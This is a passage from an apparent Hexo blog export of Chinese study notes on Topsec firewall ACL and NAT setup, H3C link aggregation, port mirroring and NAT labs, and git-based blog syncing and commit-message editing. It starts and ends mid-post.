<h2 id="区域配置"><a href="#区域配置" class="headerlink" title="区域配置"></a>区域配置</h2><p>区域配置主要用于将物理端口划入自定义的区域中，并设置访问权限是允许或禁止。</p>
<p><img src="/1012/19.PNG"></p>
<p>这里分别将物理口eth2、eth3划入区域eth30、eth31中，并设置权限为允许。</p>
<p><img src="/1012/20.PNG"></p>
<h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><h2 id="访问控制列表（ACL）"><a href="#访问控制列表（ACL）" class="headerlink" title="访问控制列表（ACL）"></a>访问控制列表（ACL）</h2><p>在天融信防火墙中，标准ACL与扩展ACL均在<code>访问控制</code>选项卡下点击<code>添加策略</code>按钮添加。</p>
<p><img src="/1012/21.PNG"></p>
<p>在添加策略的界面中，如果选择了服务即是扩展ACL，天融信下ACL默认是针对所有服务生效的。</p>
<p>这里添加一条策略，禁止<strong>jnds-nei</strong>网段对<strong>jnds-wai</strong>网段的<strong>ping服务</strong>。</p>
<p><img src="/1012/22.PNG"></p>
<p>配置完成后，可以看到该策略已出现在列表中。</p>
<p><img src="/1012/23.PNG"></p>
<h2 id="地址转换（NAT）"><a href="#地址转换（NAT）" class="headerlink" title="地址转换（NAT）"></a>地址转换（NAT）</h2><p>地址转换在<code>地址转换</code>选项卡下添加，有<strong>源转换</strong>、<strong>目的转换</strong>、<strong>双向转换</strong>等模式，工作中主要用到源转换和目的转换。</p>
<p><img src="/1012/24.PNG"></p>
<h3 id="源转换"><a href="#源转换" class="headerlink" title="源转换"></a>源转换</h3><p>添加新的地址转换，将拓扑中的<strong>jnds-nei</strong>网段对<strong>jnds-wai</strong>网段配置源转换，源地址转换为出接口地址eth3。</p>
<p><img src="/1012/25.PNG"></p>
<p>可以看到，<strong>jnds-nei</strong>网段对<strong>jnds-wai</strong>网段的源转换已经出现在列表中。</p>
<p><img src="/1012/26.PNG"></p>
<h3 id="目的转换"><a href="#目的转换" class="headerlink" title="目的转换"></a>目的转换</h3><p>目的转换模式的地址转换，为外网用户提供访问内网服务器的服务。</p>
<p>这里配置内网服务器地址为<strong>10.0.0.253</strong>，对任意网段访问<strong>外网口eth3</strong>的自动转换为访问服务器地址。</p>
<p><img src="/1012/27.PNG"></p>
<h3 id="双向转换"><a href="#双向转换" class="headerlink" title="双向转换"></a>双向转换</h3><p>双向转换即对同一源地址&#x2F;目的地址提供源转换与目的转换，配置方法与上面大体一致。</p>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>防火墙</tag>
        <tag>天融信</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day5 H3C设备配置链路聚合】</title>
    <url>/1016/</url>
    <content><![CDATA[<p>H3C模拟器上配置链路聚合。</p>
<p>系统版本v7。</p>
<span id="more"></span>

<h1 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h1><p>两台PC，两台交换机。</p>
<p><img src="/1016/1.PNG"></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]int Bridge-Aggregation 1</span><br><span class="line">[SW1]quit</span><br><span class="line">[SW1]int range g1/0/21 to g1/0/22</span><br><span class="line">[SW1-if-range]port link-aggregation group 1</span><br><span class="line"></span><br><span class="line">[SW2]int Bridge-Aggregation 1</span><br><span class="line">[SW2]quit</span><br><span class="line">[SW2]int range g1/0/21 to g1/0/22</span><br><span class="line">[SW2-if-range]port link-aggregation group 1</span><br></pre></td></tr></table></figure>

<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]display link-aggregation summary</span><br><span class="line"></span><br><span class="line">[SW2]display link-aggregation summary</span><br></pre></td></tr></table></figure>

<p>显示信息：</p>
<p><img src="/1016/2.PNG"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>v5版本与v7版本的命令大致一致，但是在创建链路组的时候命令有区别。</p>
<p>实在不想练v5版本的了，都快淘汰的版本了。弃了弃了。</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>———————————-2019.9.4更新—————————————</p>
<p>这篇只做了一个静态聚合的实验，下文补充了动态聚合和边缘端口的实验：</p>
<p><a href="http://gaoteng17.xyz/1038/">【信息网络学习 H3C设备配置链路聚合（补充）】</a></p>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>链路聚合</tag>
      </tags>
  </entry>
  <entry>
    <title>【hexo+github实现多设备同步与版本控制】</title>
    <url>/1017/</url>
    <content><![CDATA[<p>使用hexo+github搭建好静态博客后发现，只有一台电脑上有源文件，这样换了电脑就不能正常更新博客内容，总不能天天带着U盘到处拷贝吧。</p>
<p>查询后得到一个解决方法，思路是：在github静态博客项目中添加hexo分支存放博客的源文件，在正常编译部署网站前先pull下来源文件，部署好之后再push上去源文件。</p>
<span id="more"></span>

<h1 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h1><p>首先假定已有一台可以正常部署的pc，与一个已搭建完成的静态博客。</p>
<p>在新pc上分别安装<code>nodejs</code>、<code>git</code>、<code>hexo</code>。</p>
<p>安装hexo这里其实可以偷懒，直接u盘把源文件先都拷过来，这样省下了配置主题。</p>
<h1 id="源文件同步"><a href="#源文件同步" class="headerlink" title="源文件同步"></a>源文件同步</h1><p>在已可以正常部署的电脑上，在博客根目录右键打开<code>git bash</code>，执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init  //初始化本地仓库</span><br><span class="line">git add . //添加源文件至暂存区</span><br><span class="line">git commit -m <span class="string">&quot;Blog Source Hexo&quot;</span></span><br><span class="line">git branch hexo  //新建hexo分支</span><br><span class="line">git checkout hexo  //切换到hexo分支上</span><br><span class="line">git remote add origin git@github.com:yourname/yourname.github.io.git  //将本地与Github项目对接</span><br><span class="line">git push origin hexo  //push到Github项目的hexo分支上</span><br></pre></td></tr></table></figure>

<p>如图hexo分支建立成功：</p>
<p><img src="/1017/1.PNG"></p>
<h1 id="配置git"><a href="#配置git" class="headerlink" title="配置git"></a>配置git</h1><ol>
<li>在新电脑中打开<code>git bash</code>，配置个人信息：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;yourname&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your@email&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>生成密钥：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your@email&quot;</span></span><br></pre></td></tr></table></figure>
<p>按三次回车（密码为空），生成密匙。 </p>
<p>在<strong>C:\Users\用户名.ssh</strong>中，得到两个文件，分别为<code>id_rsa</code>和<code>id_rsa.pub</code>。 </p>
<p>打开<code>id_rsa.pub</code>，全选复制。粘贴到GitHub用户设置的SSH设置中。</p>
<ol start="3">
<li>测试连接：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh git@github.com</span><br><span class="line">The authenticity of host <span class="string">&#x27;github.com (52.74.223.119)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:*****************************.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes //打全yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>github.com,52.74.223.119<span class="string">&#x27; (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">PTY allocation request failed on channel 0</span></span><br><span class="line"><span class="string">Hi ******! You&#x27;</span>ve successfully authenticated, but GitHub does not provide shell access.</span><br><span class="line">Connection to github.com closed.</span><br></pre></td></tr></table></figure>

<h1 id="源文件克隆"><a href="#源文件克隆" class="headerlink" title="源文件克隆"></a>源文件克隆</h1><p>在新电脑上将源文件分支clone下来，进行初次配置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b hexo git@github.com:yourname/yourname.github.io.git  //hexo分支<span class="built_in">clone</span>到本地</span><br><span class="line"><span class="built_in">cd</span>  yourname.github.io  //切换到刚刚<span class="built_in">clone</span>的文件夹内</span><br><span class="line">npm install    //安装必要的所需组件</span><br></pre></td></tr></table></figure>

<h1 id="更新博文"><a href="#更新博文" class="headerlink" title="更新博文"></a>更新博文</h1><p>之后每次在不同的设备进行更新，都按以下流程操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull origin hexo  //先pull完成本地与远端的融合</span><br><span class="line"></span><br><span class="line">hexo g  //编译</span><br><span class="line">hexo s  //本地测试</span><br><span class="line">hexo d  //部署</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;添加博文xxx&quot;</span></span><br><span class="line">git push origin hexo</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>hexo</tag>
        <tag>git</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day6 H3C设备配置端口镜像】</title>
    <url>/1019/</url>
    <content><![CDATA[<p>H3C以太网交换机中支持本地端口镜像、二层远程端口镜像和三层远程端口镜像三种。</p>
<p>其中二层远程端口镜像的实现方式包括：固定反射端口方式、非固定反射端口方式和出端口方式。</p>
<p>在H3C模拟器上配置本地端口镜像、以及二层远程端口镜像。</p>
<p>系统版本v7。</p>
<span id="more"></span>

<h1 id="本地端口镜像"><a href="#本地端口镜像" class="headerlink" title="本地端口镜像"></a>本地端口镜像</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>本地端口镜像通过本地镜像组的方式实现，即源端口和目的端口在同一个本地镜像组中，设备将源端口的报文复制一份并转发到目的端口。</p>
<p>如图所示，源端口（GE3&#x2F;0&#x2F;1）的报文被镜像到目的端口（GE3&#x2F;0&#x2F;2），这样连接在目的端口上的数据监测设备就可以对这些报文进行监控和分析。</p>
<p><img src="/1019/1.PNG"></p>
<h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p>这里按照下面的组网图进行配置，其中DeviceC的<strong>G1&#x2F;0&#x2F;1</strong>、<strong>G1&#x2F;0&#x2F;2</strong>作为镜像源端口，<strong>G1&#x2F;0&#x2F;3</strong>作为镜像目的端口：</p>
<p><img src="/1019/4.PNG"></p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;DeviceC&gt;system-view</span><br><span class="line"></span><br><span class="line">[DeviceC]mirroring-group 1 local //建立本地镜像组</span><br><span class="line">[DeviceC]mirroring-group 1 mirroring-port  g1/0/1 g1/0/2 both </span><br><span class="line">//配置源端口。可选inbound入流量、outbound出流量、both双向流量</span><br><span class="line">[DeviceC]mirroring-group 1 monitor-port g1/0/3 //配置目的端口</span><br><span class="line"></span><br><span class="line">[DeviceC]display mirroring-group all</span><br><span class="line">Mirroring group 1:</span><br><span class="line">    Type: Local</span><br><span class="line">    Status: Active</span><br><span class="line">    Mirroring port:</span><br><span class="line">        GigabitEthernet1/0/1  Both</span><br><span class="line">        GigabitEthernet1/0/2  Both</span><br><span class="line">    Monitor port: GigabitEthernet1/0/3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="二层远程端口镜像"><a href="#二层远程端口镜像" class="headerlink" title="二层远程端口镜像"></a>二层远程端口镜像</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>二层远程端口镜像通过远程源镜像组和远程目的镜像组互相配合的方式实现。</p>
<p>二层远程端口镜像的实现方式包括：固定反射端口方式、非固定反射端口方式和出端口方式。</p>
<p>其中，固定反射端口方式和非固定反射端口方式也统称为反射端口方式，其区别在于：固定反射端口方式无需人工配置反射端口；而非固定反射端口方式需人工配置反射端口。</p>
<p>如图所示是反射端口方式的二层远程端口镜像示例。此时源设备将进入源端口GE3&#x2F;0&#x2F;1的报文复制一份给反射端口GE3&#x2F;0&#x2F;3，再由该反射端口将镜像报文在远程镜像VLAN中广播，最终镜像报文经由中间设备转发至目的设备。目的设备收到该报文后判别其VLAN ID，如果与远程镜像VLAN的VLAN ID相同，就将其转发至目的端口GE3&#x2F;0&#x2F;2，最后由该端口将镜像报文转发给数据监测设备。</p>
<p><img src="/1019/2.PNG"></p>
<p>如图所示的是出端口方式的二层远程端口镜像示例。此时源设备将进入源端口GE3&#x2F;0&#x2F;1的报文复制一份给出端口GE3&#x2F;0&#x2F;2，该端口将镜像报文转发给中间设备，再由中间设备在远程镜像VLAN中广播，最终到达目的设备。目的设备收到该报文后判别其VLAN ID，如果与远程镜像VLAN的VLAN ID相同，就将其转发至目的端口GE3&#x2F;0&#x2F;2，最后由该端口将镜像报文转发给数据监测设备。</p>
<p><img src="/1019/3.PNG"></p>
<h2 id="反射端口方式"><a href="#反射端口方式" class="headerlink" title="反射端口方式"></a>反射端口方式</h2><h3 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h3><p>这里按照下面的组网图进行配置，并定义：</p>
<ol>
<li>VLAN2为远程镜像VLAN，其中DeviceA的<strong>G1&#x2F;0&#x2F;1</strong>、<strong>G1&#x2F;0&#x2F;2</strong>作为镜像源端口，<strong>G1&#x2F;0&#x2F;5</strong>作为反射口，DeviceC的<strong>G1&#x2F;0&#x2F;2</strong>作为镜像目的端口。</li>
<li>配置DeviceA的<strong>G1&#x2F;0&#x2F;3</strong>、DeviceB的<strong>G1&#x2F;0&#x2F;1</strong>与<strong>G1&#x2F;0&#x2F;2</strong>、DeviceC的<strong>G1&#x2F;0&#x2F;1</strong>为TRUNK口，并允许VLAN2通过。</li>
</ol>
<p><img src="/1019/5.PNG"></p>
<h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><ol>
<li>DeviceA</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;DeviceA&gt;system-view</span><br><span class="line"></span><br><span class="line">[DeviceA]vlan 2</span><br><span class="line">[DeviceA-vlan2]quit</span><br><span class="line"></span><br><span class="line">[DeviceA]mirroring-group 1 remote-source //创建远程源镜像组</span><br><span class="line">[DeviceA]mirroring-group 1 remote-probe vlan 2 //配置远程镜像vlan</span><br><span class="line">[DeviceA]mirroring-group 1 mirroring-port g1/0/1 g1/0/2 both //源端口</span><br><span class="line">[DeviceA]mirroring-group 1 reflector-port g1/0/5 //反射端口</span><br><span class="line"></span><br><span class="line">[DeviceA]int g1/0/3</span><br><span class="line">[DeviceA-GigabitEthernet1/0/3]port link-type trunk</span><br><span class="line">[DeviceA-GigabitEthernet1/0/3]port trunk permit vlan 2</span><br><span class="line"></span><br><span class="line">[DeviceA]dis mirroring-group all</span><br><span class="line">Mirroring group 1:</span><br><span class="line">    Type: Remote source</span><br><span class="line">    Status: Active</span><br><span class="line">    Mirroring port:</span><br><span class="line">        GigabitEthernet1/0/1  Both</span><br><span class="line">        GigabitEthernet1/0/2  Both</span><br><span class="line">    Reflector port: GigabitEthernet1/0/5</span><br><span class="line">    Remote probe VLAN: 2</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>DeviceB</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;DeviceB&gt;system-view</span><br><span class="line"></span><br><span class="line">[DeviceB]int range g1/0/1 g1/0/2</span><br><span class="line">[DeviceB-if-range]port link-type trunk</span><br><span class="line">[DeviceB-if-range]port trunk permit vlan 2</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>DeviceC</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;DeviceC&gt;system-view</span><br><span class="line"></span><br><span class="line">[DeviceC]vlan 2</span><br><span class="line">[DeviceC-vlan2]quit</span><br><span class="line"></span><br><span class="line">[DeviceC]int g1/0/1</span><br><span class="line">[DeviceC-GigabitEthernet1/0/1]port link-type trunk</span><br><span class="line">[DeviceC-GigabitEthernet1/0/1]port trunk permit vlan 2</span><br><span class="line">[DeviceC-GigabitEthernet1/0/1]quit</span><br><span class="line"></span><br><span class="line">[DeviceC]mirroring-group 1 remote-destination //创建远程目的镜像组</span><br><span class="line">[DeviceC]mirroring-group 1 remote-probe vlan 2 //配置远程镜像vlan</span><br><span class="line">[DeviceC]mirroring-group 1 monitor-port g1/0/2 //目的端口</span><br><span class="line"></span><br><span class="line">[DeviceC]int g1/0/2</span><br><span class="line">[DeviceC-GigabitEthernet1/0/2]port access vlan 2 //目的端口改vlan</span><br><span class="line"></span><br><span class="line">[DeviceC]dis mirroring-group all</span><br><span class="line">Mirroring group 1:</span><br><span class="line">    Type: Remote destination</span><br><span class="line">    Status: Active</span><br><span class="line">    Monitor port: GigabitEthernet1/0/2</span><br><span class="line">    Remote probe VLAN: 2</span><br></pre></td></tr></table></figure>

<h2 id="出端口方式"><a href="#出端口方式" class="headerlink" title="出端口方式"></a>出端口方式</h2><h3 id="拓扑-2"><a href="#拓扑-2" class="headerlink" title="拓扑"></a>拓扑</h3><p>这里按照下面的组网图进行配置，并定义：</p>
<ol>
<li>VLAN2为远程镜像VLAN，其中DeviceA的<strong>G1&#x2F;0&#x2F;1</strong>、<strong>G1&#x2F;0&#x2F;2</strong>作为镜像源端口，<strong>G1&#x2F;0&#x2F;3</strong>作为出端口，DeviceC的<strong>G1&#x2F;0&#x2F;2</strong>作为镜像目的端口。</li>
<li>配置DeviceA的<strong>G1&#x2F;0&#x2F;3</strong>、DeviceB的<strong>G1&#x2F;0&#x2F;1</strong>与<strong>G1&#x2F;0&#x2F;2</strong>、DeviceC的<strong>G1&#x2F;0&#x2F;1</strong>为TRUNK口，并允许VLAN2通过。</li>
</ol>
<p><img src="/1019/6.PNG"></p>
<h3 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h3><ol>
<li>DeviceA</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;DeviceA&gt;system-view</span><br><span class="line"></span><br><span class="line">[DeviceA]vlan 2</span><br><span class="line">[DeviceA-vlan2]quit</span><br><span class="line"></span><br><span class="line">[DeviceA]mirroring-group 1 remote-source //创建远程源镜像组</span><br><span class="line">[DeviceA]mirroring-group 1 remote-probe vlan 2 //配置远程镜像vlan</span><br><span class="line">[DeviceA]mirroring-group 1 mirroring-port g1/0/1 g1/0/2 both //源端口</span><br><span class="line">[DeviceA]mirroring-group 1 monitor-egress g1/0/3 //出端口</span><br><span class="line"></span><br><span class="line">[DeviceA]int g1/0/3</span><br><span class="line">[DeviceA-GigabitEthernet1/0/3]port link-type trunk</span><br><span class="line">[DeviceA-GigabitEthernet1/0/3]port trunk permit vlan 2</span><br><span class="line"></span><br><span class="line">[DeviceA]dis mirroring-group all</span><br><span class="line">Mirroring group 1:</span><br><span class="line">    Type: Remote source</span><br><span class="line">    Status: Active</span><br><span class="line">    Mirroring port:</span><br><span class="line">        GigabitEthernet1/0/1  Both</span><br><span class="line">        GigabitEthernet1/0/2  Both</span><br><span class="line">    Monitor egress port: GigabitEthernet1/0/3</span><br><span class="line">    Remote probe VLAN: 2</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>DeviceB</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;DeviceB&gt;system-view</span><br><span class="line"></span><br><span class="line">[DeviceB]int range g1/0/1 g1/0/2</span><br><span class="line">[DeviceB-if-range]port link-type trunk</span><br><span class="line">[DeviceB-if-range]port trunk permit vlan 2</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>DeviceC</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;DeviceC&gt;system-view</span><br><span class="line"></span><br><span class="line">[DeviceC]vlan 2</span><br><span class="line">[DeviceC-vlan2]quit</span><br><span class="line"></span><br><span class="line">[DeviceC]int g1/0/1</span><br><span class="line">[DeviceC-GigabitEthernet1/0/1]port link-type trunk</span><br><span class="line">[DeviceC-GigabitEthernet1/0/1]port trunk permit vlan 2</span><br><span class="line">[DeviceC-GigabitEthernet1/0/1]quit</span><br><span class="line"></span><br><span class="line">[DeviceC]mirroring-group 1 remote-destination //创建远程目的镜像组</span><br><span class="line">[DeviceC]mirroring-group 1 remote-probe vlan 2 //配置远程镜像vlan</span><br><span class="line">[DeviceC]mirroring-group 1 monitor-port g1/0/2 //目的端口</span><br><span class="line"></span><br><span class="line">[DeviceC]int g1/0/2</span><br><span class="line">[DeviceC-GigabitEthernet1/0/2]port access vlan 2 //目的端口改vlan</span><br><span class="line"></span><br><span class="line">[DeviceC]dis mirroring-group all</span><br><span class="line">Mirroring group 1:</span><br><span class="line">    Type: Remote destination</span><br><span class="line">    Status: Active</span><br><span class="line">    Monitor port: GigabitEthernet1/0/2</span><br><span class="line">    Remote probe VLAN: 2</span><br></pre></td></tr></table></figure>

<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>交换机的镜像配置非常消耗交换机资源，如无需求一般不进行设置。</p>
<p>同时设置为镜像目的端口的交换机端口只能用于流量监控，不能用于通讯。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C交换机端口镜像原理.茶乡浪子(<a href="https://blog.csdn.net/lycb_gz/article/details/7773834">https://blog.csdn.net/lycb_gz/article/details/7773834</a> )</li>
<li>H3C端口镜像配置手册</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>端口镜像</tag>
      </tags>
  </entry>
  <entry>
    <title>【git修改commit注释信息】</title>
    <url>/1018/</url>
    <content><![CDATA[<p>使用git在进行commit提交时，后面跟上<code>-m &quot;注释信息&quot;</code>即可提交注释信息，非常方便。</p>
<p>可是当提交信息写错或者需要修改时，傻眼了。</p>
<p>还好，git提供了修改commit注释消息的功能。</p>
<span id="more"></span>

<h1 id="修改最后一次提交的注释信息"><a href="#修改最后一次提交的注释信息" class="headerlink" title="修改最后一次提交的注释信息"></a>修改最后一次提交的注释信息</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit --amend <span class="comment">#修改最近一次提交的注释信息</span></span><br></pre></td></tr></table></figure>

<p><code>vim</code>里，按<code>i</code>即可编辑，修改完毕后按<code>Esc</code>，输入<code>:wq</code>后保存退出。</p>
<p>之后推送到服务器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push -f</span><br></pre></td></tr></table></figure>

<h1 id="修改历史提交的注释信息"><a href="#修改历史提交的注释信息" class="headerlink" title="修改历史提交的注释信息"></a>修改历史提交的注释信息</h1><p><strong>amend</strong>可以修改最后一次commit信息，但对于历史提交信息，需要使用<strong>rebase</strong>命令。</p>
<ol>
<li>要修改倒数第n条，使用下述命令：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git rebase -i HEAD~n   //修改第一条可以写git rebase -i --root</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>把要修改的commit注释消息前面的<code>pick</code>改为<code>edit</code>。修改完<code>:wq</code>保存退出。</p>
</li>
<li><p>修改commit信息，<code>:wq</code>保存退出。</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit --amend</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>完成变基操作</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git rebase --<span class="built_in">continue</span></span><br></pre></td></tr></table></figure>

<ol start="5">
<li>推送到服务器：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push -f</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day9 H3C设备配置地址转换（NAT）】</title>
    <url>/1023/</url>
    <content><![CDATA[<p>网络迅速发展， IPv4地址不敷使用，同时由于IPv4地址分配不均，当私有地址用户需要访问Internet时，需要通过NAT提供私有地址到公有地址的转换。</p>
<p>NAT大体分为以下几个方面：<strong>静态NAT（一对一双向）</strong>、<strong>Basic NAT（多对多）</strong>、<strong>NAPT（多对一）</strong>、<strong>Easy IP（多对一，NAPT特例）</strong>、<strong>NAT Server（一对一，内部服务器）</strong>。</p>
<p>在H3C模拟器上进行地址转换（NAT）的配置，系统版本v7。</p>
<span id="more"></span>

<h1 id="静态NAT"><a href="#静态NAT" class="headerlink" title="静态NAT"></a>静态NAT</h1><h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p><img src="/1023/1.PNG"></p>
<p>按照图中拓扑图，将R1、R2间网络定义为内网段（<strong>192.168.0.0&#x2F;24</strong>），R2、R3间网络定义为外网段（<strong>20.0.0.0&#x2F;24</strong>）。</p>
<p>启用ospf协议，使全网互通。并开启R1的telnet服务，以便后面验证nat转换的<strong>双向性</strong>。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R2]nat static outbound 192.168.0.1 20.0.0.1 //若选择inbound方式则反写内外网ip</span><br><span class="line"></span><br><span class="line">[R2]int g0/1</span><br><span class="line">[R2-GigabitEthernet0/1]nat static enable     //outbound方式选择出端口开启</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>从R1 ping R3，在R2查看转换表项：</p>
<p><img src="/1023/2.PNG"></p>
<p>可以看出，R3回复R1时，回复地址是<strong>20.0.0.1</strong>，可知R2将R1的内网ip<strong>192.168.0.1</strong>转换为了外网ip<strong>20.0.0.1</strong>。</p>
<p>下面从R3 telnet R2的g0&#x2F;1口，可以看到telnet到了R1上面：</p>
<p><img src="/1023/3.PNG"></p>
<h1 id="Basic-NAT"><a href="#Basic-NAT" class="headerlink" title="Basic NAT"></a>Basic NAT</h1><h2 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h2><p><img src="/1023/4.PNG"></p>
<p>按照上图连接，并在内网出口路由器RTA上配置一条缺省路由：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTA]ip route-static 0.0.0.0 0 198.76.28.2</span><br></pre></td></tr></table></figure>

<p>此时在PC1、PC2上ping公网Server是不通的，因为在公网路由器上不可能有私网的路由，从Server回应的ping响应报文到RTB的路由表上无法找到<strong>10.0.0.0</strong>网段的路由。</p>
<h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTA]acl basic 2000 //配置需转换地址的列表，permit</span><br><span class="line">[RTA-acl-ipv4-basic-2000]description BasicNAT</span><br><span class="line">[RTA-acl-ipv4-basic-2000]rule 0 permit source 10.0.0.0 0.0.0.255</span><br><span class="line">[RTA-acl-ipv4-basic-2000]quit</span><br><span class="line"></span><br><span class="line">[RTA]nat address-group 1  //配置转换后的地址池</span><br><span class="line">[RTA-address-group-1]address 198.76.28.11 198.76.28.20</span><br><span class="line">[RTA-address-group-1]quit</span><br><span class="line"></span><br><span class="line">[RTA]int g0/0</span><br><span class="line">[RTA-GigabitEthernet0/0]nat outbound 2000 address-group 1 no-pat //出端口启用，模式no-pat</span><br></pre></td></tr></table></figure>

<h2 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h2><p>此时在PC1、PC2上可以ping通公网Server。</p>
<p>在RTA上查看NAT转换表项，总计两条：</p>
<p><img src="/1023/5.PNG"></p>
<p>使用<code>verbose</code>可以查看详细信息：</p>
<p><img src="/1023/6.PNG"></p>
<h1 id="NAPT"><a href="#NAPT" class="headerlink" title="NAPT"></a>NAPT</h1><h2 id="拓扑-2"><a href="#拓扑-2" class="headerlink" title="拓扑"></a>拓扑</h2><p>拓扑同上。</p>
<h2 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTA]acl basic 2000 //配置需转换地址的列表，permit</span><br><span class="line">[RTA-acl-ipv4-basic-2000]description BasicNAT</span><br><span class="line">[RTA-acl-ipv4-basic-2000]rule 0 permit source 10.0.0.0 0.0.0.255</span><br><span class="line">[RTA-acl-ipv4-basic-2000]quit</span><br><span class="line"></span><br><span class="line">[RTA]nat address-group 1  //配置转换后的地址池</span><br><span class="line">[RTA-address-group-1]address 198.76.28.11 198.76.28.11</span><br><span class="line">[RTA-address-group-1]quit</span><br><span class="line"></span><br><span class="line">[RTA]int g0/0</span><br><span class="line">[RTA-GigabitEthernet0/0]nat outbound 2000 address-group 1 //出端口启用，不带no-pat，表明NAT要对数据包进行端口转发</span><br></pre></td></tr></table></figure>

<h2 id="验证-2"><a href="#验证-2" class="headerlink" title="验证"></a>验证</h2><p>此时在PC1、PC2上可以ping通公网Server。</p>
<p>在RTA上查看NAT转换表项，总计两条：</p>
<p><img src="/1023/7.PNG"></p>
<p>可以看出，PC1、PC2地址转换后的公网IP地址均是<strong>198.76.28.11</strong>，不同的是端口号（这里出了点问题，不知道为啥端口号只显示0）。</p>
<h1 id="Easy-IP"><a href="#Easy-IP" class="headerlink" title="Easy IP"></a>Easy IP</h1><h2 id="拓扑-3"><a href="#拓扑-3" class="headerlink" title="拓扑"></a>拓扑</h2><p>拓扑同上。</p>
